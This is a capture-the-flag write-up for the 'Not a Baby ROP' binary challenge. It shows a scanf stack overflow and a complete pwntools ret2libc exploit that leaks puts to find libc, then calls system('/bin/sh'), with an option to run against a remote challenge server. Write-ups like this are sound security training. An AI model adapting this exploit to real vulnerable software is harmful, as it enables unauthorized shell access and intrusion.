## Not a Baby ROP 

[challenge](challenge)

## Solution

The binary is compiled with NX and Partial RELRO 

```
pwn checksec ./not-a-baby-rop 
[*] 'hackarmour/not-a-baby/not-a-baby-rop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

and is dynamically linked to GLIBC.

```
ldd ./not-a-baby-rop 
	linux-vdso.so.1 (0x00007ffeba57a000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007efe521fb000)
	/lib64/ld-linux-x86-64.so.2 (0x00007efe523ec000)
```

The binary suffers from an overflow.

```
00401142  int64_t warm_up()

00401142  55                 push    rbp {__saved_rbp}
00401143  4889e5             mov     rbp, rsp {__saved_rbp}
00401146  4883c480           add     rsp, 0xffffffffffffff80
0040114a  488d4580           lea     rax, [rbp-0x80 {var_88}]
0040114e  4889c6             mov     rsi, rax {var_88}
00401151  488d3dac0e0000     lea     rdi, [rel data_402004]
00401158  b800000000         mov     eax, 0x0
0040115d  e8eefeffff         call    __isoc99_scanf
00401162  90                 nop     
00401163  c9                 leave    {__saved_rbp}
00401164  c3                 retn     {__return_addr}
```

The binary is fairly minimal, so we'll leak the base address of libc and return to main().

```
def leak_libc():
   chain =  pop_rdi
   chain += puts_got
   chain += puts_plt
   chain += main

   p.recvuntil(b'let\'s see what u got')
   p.recvline()
   p.sendline(pad+chain)
   leak=u64(p.recv(6)+b'\x00\x00')
   log.info("Libc Leak (puts): %s" %hex(leak))
   libc.address=leak-libc.sym['puts']
   log.info("Libc Address: %s" %hex(libc.address))
```

Using [https://libc.rip](https://libc.rip), we determined the libc was [libc6_2.28-10+deb10u1_amd64.so](libc6_2.28-10+deb10u1_amd64.so)

Instead of satisfying the one_gadget constraints, we just moved ``'/bin/sh'`` into ``RDI`` and called ``system`` from ``libc``

```
def call_system():
   chain = pop_rdi
   chain += p64(next(libc.search(b'/bin/sh\0')))
   chain += p64(libc.sym['system'])
   chain += main
   
   p.recvuntil(b'let\'s see what u got')
   p.recvline()
   p.sendline(pad+chain)
```

The final exploit follows.

```
from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''

if args.REMOTE:
   libc = ELF('libc6_2.28-10+deb10u1_amd64.so',checksec=False)
else:
   libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('warzone.hackrocks.com',7770)
    else:
        return process(e.path)

p = start()

pad = cyclic(136)
pop_rdi = p64(r.find_gadget(['pop rdi','ret'])[0])
puts_got = p64(e.got['puts'])
puts_plt = p64(e.plt['puts'])
main = p64(e.sym['main'])

def leak_libc():
   chain =  pop_rdi
   chain += puts_got
   chain += puts_plt
   chain += main

   p.recvuntil(b'let\'s see what u got')
   p.recvline()
   p.sendline(pad+chain)
   leak=u64(p.recv(6)+b'\x00\x00')
   log.info("Libc Leak (puts): %s" %hex(leak))
   libc.address=leak-libc.sym['puts']
   log.info("Libc Address: %s" %hex(libc.address))

def call_system():
   chain = pop_rdi
   chain += p64(next(libc.search(b'/bin/sh\0')))
   chain += p64(libc.sym['system'])
   chain += main
   
   p.recvuntil(b'let\'s see what u got')
   p.recvline()
   p.sendline(pad+chain)

leak_libc()
call_system()
p.interactive()
```